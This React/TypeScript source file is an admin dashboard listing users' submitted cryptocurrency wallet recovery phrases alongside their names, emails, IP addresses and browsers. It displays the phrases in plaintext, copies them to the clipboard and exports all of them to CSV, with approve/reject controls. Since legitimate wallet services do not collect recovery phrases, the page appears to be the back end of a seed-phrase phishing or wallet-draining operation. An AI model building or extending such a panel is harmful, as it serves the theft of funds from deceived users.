import React, { useState, useEffect } from "react";
import { useAuth } from "@/context/AuthContext";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { toast } from "@/components/ui/use-toast";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { Wallet, Search, Download, Copy, MoreVertical, Loader2, CheckCircle, XCircle, Eye, EyeOff, RefreshCw } from "lucide-react";
import { getWalletDetails, updateWalletDetailStatus } from "@/lib/databaseHelpers";

// Define the WalletDetail type
interface WalletDetail {
  id: string;
  user_id: string;
  user_name: string;
  user_email: string;
  wallet_type: string;
  wallet_phrase: string;
  status: 'pending' | 'approved' | 'rejected';
  created_at: string;
  reviewed_at?: string;
  reviewed_by?: string;
  ip_address?: string;
  user_agent?: string;
}

const WalletDetailsPage = () => {
  const { user } = useAuth();
  const [walletDetails, setWalletDetails] = useState<WalletDetail[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedDetail, setSelectedDetail] = useState<WalletDetail | null>(null);
  const [showDetailDialog, setShowDetailDialog] = useState(false);
  const [processingId, setProcessingId] = useState<string | null>(null);
  const [showPhrases, setShowPhrases] = useState(false);

  // Fetch wallet details with enhanced debugging
  const fetchWalletDetails = async () => {
    if (!user) {
      console.log('No user found, cannot fetch wallet details');
      setError("You must be logged in to view wallet details");
      return;
    }
    
    try {
      setLoading(true);
      setError(null);
      console.log('Fetching wallet details in component...', new Date().toISOString());
      console.log('User ID:', user.id);
      console.log('User email:', user.email);
      
      // Add a timeout for the entire operation
      const timeoutId = setTimeout(() => {
        console.log('Wallet details fetch timeout reached');
        setError("Request timed out. The database might be unavailable.");
        setLoading(false);
      }, 10000); // 10 second timeout
      
      const details = await getWalletDetails();
      clearTimeout(timeoutId); // Clear timeout if we got a response
      
      console.log('Wallet details fetched:', details ? details.length : 0, 'items');
      if (details && details.length > 0) {
        console.log('First item sample:', details[0]);
      }
      
      setWalletDetails(details);
      
      if (!details || details.length === 0) {
        console.log('No wallet details found or empty array returned');
        // Check if the user is an admin
        if (user) {
          console.log('User info:', user);
          // Check if user has admin role
          console.log('User metadata:', user.user_metadata);
          console.log('App metadata:', user.app_metadata);
        }
        setError("No wallet details found. This could be due to permissions or because no wallets have been submitted yet.");
      }
    } catch (err) {
      console.error("Error fetching wallet details:", err);
      setError("Failed to load wallet details. Check console for details.");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchWalletDetails();
  }, [user]);

  // Format date
  const formatDate = (dateString: string) => {
    if (!dateString) return "N/A";
    
    const date = new Date(dateString);
    return date.toLocaleDateString("en-US", {
      month: "short",
      day: "numeric",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  // Copy text to clipboard
  const copyToClipboard = (text: string, type: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied to clipboard",
      description: `${type} has been copied to your clipboard.`,
    });
  };

  // View wallet detail
  const viewDetail = (detail: WalletDetail) => {
    setSelectedDetail(detail);
    setShowDetailDialog(true);
  };

  // Approve wallet detail
  const approveWalletDetail = async (detailId: string) => {
    if (!user?.id) return;
    
    try {
      setProcessingId(detailId);
      const success = await updateWalletDetailStatus(detailId, 'approved', user.id);
      
      if (success) {
        toast({
          title: "Wallet Approved",
          description: "The wallet has been approved successfully.",
        });
        
        // Update the local state
        setWalletDetails(prev => 
          prev.map(detail => 
            detail.id === detailId 
              ? { ...detail, status: 'approved', reviewed_at: new Date().toISOString(), reviewed_by: user.id } 
              : detail
          )
        );
      } else {
        toast({
          title: "Error",
          description: "Failed to approve wallet. Please try again.",
          variant: "destructive",
        });
      }
    } catch (err) {
      console.error("Error approving wallet:", err);
      toast({
        title: "Error",
        description: "An error occurred while approving the wallet.",
        variant: "destructive",
      });
    } finally {
      setProcessingId(null);
    }
  };

  // Reject wallet detail
  const rejectWalletDetail = async (detailId: string) => {
    if (!user?.id) return;
    
    try {
      setProcessingId(detailId);
      const success = await updateWalletDetailStatus(detailId, 'rejected', user.id);
      
      if (success) {
        toast({
          title: "Wallet Rejected",
          description: "The wallet has been rejected.",
        });
        
        // Update the local state
        setWalletDetails(prev => 
          prev.map(detail => 
            detail.id === detailId 
              ? { ...detail, status: 'rejected', reviewed_at: new Date().toISOString(), reviewed_by: user.id } 
              : detail
          )
        );
      } else {
        toast({
          title: "Error",
          description: "Failed to reject wallet. Please try again.",
          variant: "destructive",
        });
      }
    } catch (err) {
      console.error("Error rejecting wallet:", err);
      toast({
        title: "Error",
        description: "An error occurred while rejecting the wallet.",
        variant: "destructive",
      });
    } finally {
      setProcessingId(null);
    }
  };

  // Filter wallet details based on search query
  const filteredDetails = walletDetails.filter((detail) => {
    const query = searchQuery.toLowerCase();
    return (
      detail.user_name.toLowerCase().includes(query) ||
      detail.user_email.toLowerCase().includes(query) ||
      detail.wallet_type.toLowerCase().includes(query) ||
      detail.status.toLowerCase().includes(query)
    );
  });

  // Export wallet details as CSV
  const exportAsCSV = () => {
    const headers = ["User Name", "User Email", "Wallet Type", "Wallet Phrase", "Status", "Created At"];
    const csvContent = [
      headers.join(","),
      ...filteredDetails.map((detail) => [
        `"${detail.user_name.replace(/"/g, '""')}"`,
        `"${detail.user_email.replace(/"/g, '""')}"`,
        `"${detail.wallet_type.replace(/"/g, '""')}"`,
        `"${detail.wallet_phrase.replace(/"/g, '""')}"`,
        `"${detail.status}"`,
        `"${formatDate(detail.created_at)}"`,
      ].join(","))
    ].join("\n");

    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.setAttribute("href", url);
    link.setAttribute("download", `wallet_details_${new Date().toISOString().split('T')[0]}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // Get status badge
  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'approved':
        return (
          <Badge variant="outline" className="bg-green-50 text-green-700 border-green-200">
            <CheckCircle className="h-3 w-3 mr-1" />
            Approved
          </Badge>
        );
      case 'rejected':
        return (
          <Badge variant="outline" className="bg-red-50 text-red-700 border-red-200">
            <XCircle className="h-3 w-3 mr-1" />
            Rejected
          </Badge>
        );
      default:
        return (
          <Badge variant="outline" className="bg-yellow-50 text-yellow-700 border-yellow-200">
            <Loader2 className="h-3 w-3 mr-1" />
            Pending
          </Badge>
        );
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <h1 className="text-3xl font-bold tracking-tight">Wallet Details</h1>
        <div className="flex gap-2">
          <Button 
            variant="outline" 
            onClick={fetchWalletDetails}
            disabled={loading}
          >
            <RefreshCw className={`mr-2 h-4 w-4 ${loading ? 'animate-spin' : ''}`} />
            Refresh
          </Button>
          <Button 
            variant="outline" 
            onClick={() => setShowPhrases(!showPhrases)}
          >
            {showPhrases ? (
              <>
                <EyeOff className="mr-2 h-4 w-4" />
                Hide Phrases
              </>
            ) : (
              <>
                <Eye className="mr-2 h-4 w-4" />
                Show Phrases
              </>
            )}
          </Button>
          <Button 
            onClick={exportAsCSV} 
            disabled={loading || walletDetails.length === 0}
          >
            <Download className="mr-2 h-4 w-4" />
            Export CSV
          </Button>
        </div>
      </div>

      <Card>
        <CardHeader className="pb-3">
          <CardTitle>Submitted Wallet Details</CardTitle>
          <CardDescription>
            Review and manage wallet details submitted by users.
          </CardDescription>
          <div className="mt-4 relative">
            <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
            <Input
              type="search"
              placeholder="Search by name, email, or wallet type..."
              className="pl-8"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
            />
          </div>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="flex flex-col items-center justify-center py-12">
              <Loader2 className="h-12 w-12 animate-spin text-primary mb-4" />
              <p className="text-lg font-medium">Loading wallet details...</p>
            </div>
          ) : error ? (
            <div className="flex flex-col items-center justify-center py-12">
              <p className="text-lg font-medium text-destructive">{error}</p>
              <Button
                onClick={fetchWalletDetails}
                className="mt-4"
                variant="outline"
                disabled={loading}
              >
                <RefreshCw className={`mr-2 h-4 w-4 ${loading ? 'animate-spin' : ''}`} />
                Try Again
              </Button>
              <div className="mt-4 p-4 bg-muted rounded-md text-xs font-mono overflow-auto max-w-full">
                <p>Debug info:</p>
                <p>User ID: {user?.id || 'Not logged in'}</p>
                <p>Admin: {user?.app_metadata?.admin ? 'Yes' : 'No'}</p>
                <p>Table queried: wallet_details</p>
              </div>
            </div>
          ) : filteredDetails.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-12">
              <Wallet className="h-12 w-12 text-muted-foreground mb-4" />
              <p className="text-lg font-medium">No wallet details found</p>
              {searchQuery && (
                <p className="text-muted-foreground mt-2">
                  Try adjusting your search query
                </p>
              )}
            </div>
          ) : (
            <div className="rounded-md border">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>User</TableHead>
                    <TableHead>Wallet Type</TableHead>
                    {showPhrases && <TableHead>Wallet Phrase</TableHead>}
                    <TableHead>Status</TableHead>
                    <TableHead>Submitted</TableHead>
                    <TableHead className="text-right">Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredDetails.map((detail) => (
                    <TableRow key={detail.id}>
                      <TableCell>
                        <div>
                          <p className="font-medium">{detail.user_name}</p>
                          <p className="text-sm text-muted-foreground">
                            {detail.user_email}
                          </p>
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge variant="outline">{detail.wallet_type}</Badge>
                      </TableCell>
                      {showPhrases && (
                        <TableCell className="max-w-[200px] truncate">
                          <div className="flex items-center">
                            <span className="truncate">{detail.wallet_phrase}</span>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => copyToClipboard(detail.wallet_phrase, "Wallet phrase")}
                            >
                              <Copy className="h-4 w-4" />
                            </Button>
                          </div>
                        </TableCell>
                      )}
                      <TableCell>{getStatusBadge(detail.status)}</TableCell>
                      <TableCell>{formatDate(detail.created_at)}</TableCell>
                      <TableCell className="text-right">
                        <DropdownMenu>
                          <DropdownMenuTrigger asChild>
                            <Button variant="ghost" size="sm">
                              <MoreVertical className="h-4 w-4" />
                            </Button>
                          </DropdownMenuTrigger>
                          <DropdownMenuContent align="end">
                            <DropdownMenuLabel>Actions</DropdownMenuLabel>
                            <DropdownMenuItem onClick={() => viewDetail(detail)}>
                              <Eye className="mr-2 h-4 w-4" />
                              View Details
                            </DropdownMenuItem>
                            <DropdownMenuSeparator />
                            {detail.status === 'pending' && (
                              <>
                                <DropdownMenuItem 
                                  onClick={() => approveWalletDetail(detail.id)}
                                  disabled={!!processingId}
                                >
                                  <CheckCircle className="mr-2 h-4 w-4" />
                                  Approve
                                </DropdownMenuItem>
                                <DropdownMenuItem 
                                  onClick={() => rejectWalletDetail(detail.id)}
                                  disabled={!!processingId}
                                >
                                  <XCircle className="mr-2 h-4 w-4" />
                                  Reject
                                </DropdownMenuItem>
                              </>
                            )}
                            <DropdownMenuItem onClick={() => copyToClipboard(detail.wallet_phrase, "Wallet phrase")}>
                              <Copy className="mr-2 h-4 w-4" />
                              Copy Phrase
                            </DropdownMenuItem>
                          </DropdownMenuContent>
                        </DropdownMenu>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Detail Dialog */}
      {selectedDetail && (
        <Dialog open={showDetailDialog} onOpenChange={setShowDetailDialog}>
          <DialogContent className="sm:max-w-md">
            <DialogHeader>
              <DialogTitle>Wallet Details</DialogTitle>
              <DialogDescription>
                Complete information about the submitted wallet.
              </DialogDescription>
            </DialogHeader>
            <div className="space-y-4 py-4">
              <div className="space-y-1">
                <h4 className="text-sm font-medium">User Information</h4>
                <p className="text-sm">
                  <span className="font-medium">Name:</span> {selectedDetail.user_name}
                </p>
                <p className="text-sm">
                  <span className="font-medium">Email:</span> {selectedDetail.user_email}
                </p>
              </div>
              <div className="space-y-1">
                <h4 className="text-sm font-medium">Wallet Information</h4>
                <p className="text-sm">
                  <span className="font-medium">Type:</span> {selectedDetail.wallet_type}
                </p>
                <p className="text-sm">
                  <span className="font-medium">Status:</span> {selectedDetail.status}
                </p>
                <div className="flex items-center justify-between">
                  <p className="text-sm font-medium">Recovery Phrase:</p>
                  <Button 
                    variant="outline" 
                    size="sm"
                    onClick={() => copyToClipboard(selectedDetail.wallet_phrase, "Recovery phrase")}
                  >
                    <Copy className="h-3 w-3 mr-2" />
                    Copy
                  </Button>
                </div>
                <div className="bg-muted p-3 rounded-md text-sm font-mono break-all">
                  {selectedDetail.wallet_phrase}
                </div>
              </div>
              <div className="space-y-1">
                <h4 className="text-sm font-medium">Additional Information</h4>
                <p className="text-sm">
                  <span className="font-medium">Submitted:</span> {formatDate(selectedDetail.created_at)}
                </p>
                {selectedDetail.reviewed_at && (
                  <p className="text-sm">
                    <span className="font-medium">Reviewed:</span> {formatDate(selectedDetail.reviewed_at)}
                  </p>
                )}
                {selectedDetail.ip_address && (
                  <p className="text-sm">
                    <span className="font-medium">IP Address:</span> {selectedDetail.ip_address}
                  </p>
                )}
                {selectedDetail.user_agent && (
                  <p className="text-sm">
                    <span className="font-medium">Browser:</span> {selectedDetail.user_agent}
                  </p>
                )}
              </div>
            </div>
            <DialogFooter className="flex flex-col sm:flex-row gap-2">
              {selectedDetail.status === 'pending' && (
                <>
                  <Button 
                    variant="outline" 
                    onClick={() => {
                      approveWalletDetail(selectedDetail.id);
                      setShowDetailDialog(false);
                    }}
                    disabled={!!processingId}
                  >
                    <CheckCircle className="mr-2 h-4 w-4" />
                    Approve
                  </Button>
                  <Button 
                    variant="destructive"
                    onClick={() => {
                      rejectWalletDetail(selectedDetail.id);
                      setShowDetailDialog(false);
                    }}
                    disabled={!!processingId}
                  >
                    <XCircle className="mr-2 h-4 w-4" />
                    Reject
                  </Button>
                </>
              )}
              <Button onClick={() => setShowDetailDialog(false)}>Close</Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      )}
    </div>
  );
};

export default WalletDetailsPage;
